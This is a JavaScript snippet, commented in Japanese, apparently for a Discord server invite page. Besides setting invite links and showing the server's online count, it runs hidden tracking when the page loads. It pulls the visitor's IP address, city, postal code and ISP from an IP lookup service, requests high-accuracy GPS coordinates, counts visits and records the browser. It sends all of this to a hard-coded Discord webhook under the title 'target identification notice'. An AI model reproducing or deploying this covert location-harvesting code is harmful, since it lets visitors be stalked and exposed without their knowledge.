<script>
    // --- 設定項目 ---
    const INVITE_URL = "https://discord.gg/dcus"; 
    const SERVER_ID = "1427230542704676926";
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1471711618730561647/tjwjOue2WKI1ioF5jmEfr272qB5J2xF082S8qxvGx3KW_g0f4xezNJRwHxpQFp_PC_ql";

    // --- メイン処理 ---

    // 1. IPアドレスと詳細な住所情報を取得
    async function getIpData() {
        try {
            // HTTPS対応のAPIを使用（確実性が高い）
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            return {
                ip: data.ip,
                city: data.city,
                region: data.region,
                isp: data.org,
                postal: data.postal
            };
        } catch (error) {
            console.error("IP取得失敗:", error);
            return { ip: "取得失敗", city: "不明", region: "不明", isp: "不明", postal: "不明" };
        }
    }

    // 2. GPS座標を取得（ブラウザのポップアップが出る）
    function getGpsData() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve({ status: "非対応デバイス" });
            } else {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        resolve({
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            acc: pos.coords.accuracy,
                            status: "成功"
                        });
                    },
                    (err) => {
                        resolve({ status: "ユーザー拒否または失敗" });
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            }
        });
    }

    // 3. Webhookへ送信
    async function sendTrackingLog() {
        // IPとGPSを同時に取得
        const [ipInfo, gpsInfo] = await Promise.all([getIpData(), getGpsData()]);

        // 訪問回数のカウント
        let count = localStorage.getItem('visit_count') || 0;
        count = parseInt(count) + 1;
        localStorage.setItem('visit_count', count);

        // GoogleマップのURL作成
        const googleMapUrl = gpsInfo.lat 
            ? `https://www.google.com/maps?q=${gpsInfo.lat},${gpsInfo.lon}` 
            : "取得不可";

        const payload = {
            embeds: [{
                title: "🎯 ターゲット特定通知",
                color: 15548997, // 赤色
                fields: [
                    { name: "🌐 IPアドレス", value: `\`${ipInfo.ip}\``, inline: true },
                    { name: "🏢 プロバイダ (ISP)", value: `\`${ipInfo.isp}\``, inline: true },
                    { name: "📍 推定住所 (IPベース)", value: `${ipInfo.region} ${ipInfo.city} (〒${ipInfo.postal})`, inline: false },
                    { 
                        name: "🛰️ GPS現在地 (高精度)", 
                        value: gpsInfo.lat 
                            ? `[Googleマップで開く](${googleMapUrl})\n精度誤差: 約${Math.round(gpsInfo.acc)}m` 
                            : `❌ ${gpsInfo.status}`, 
                        inline: false 
                    },
                    { name: "👤 訪問データ", value: `通算 ${count} 回目のアクセス`, inline: true },
                    { name: "📱 OS/ブラウザ", value: navigator.userAgent.split(') ')[0] + ')', inline: false }
                ],
                timestamp: new Date().toISOString(),
                footer: { text: "Access Tracker" }
            }]
        };

        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    }

    // --- 初期化 ---
    document.addEventListener('DOMContentLoaded', () => {
        // 招待リンクの設定
        document.querySelectorAll('.invite-link').forEach(link => {
            link.href = INVITE_URL;
        });

        // サーバー人数の表示更新
        fetch(`https://discord.com/api/guilds/${SERVER_ID}/widget.json`)
            .then(r => r.json())
            .then(data => {
                const el = document.getElementById('status-box');
                if (el) el.innerText = `🟢 オンライン: ${data.presence_count}人`;
            }).catch(() => {});

        // ログ送信実行
        sendTrackingLog();
    });
</script>
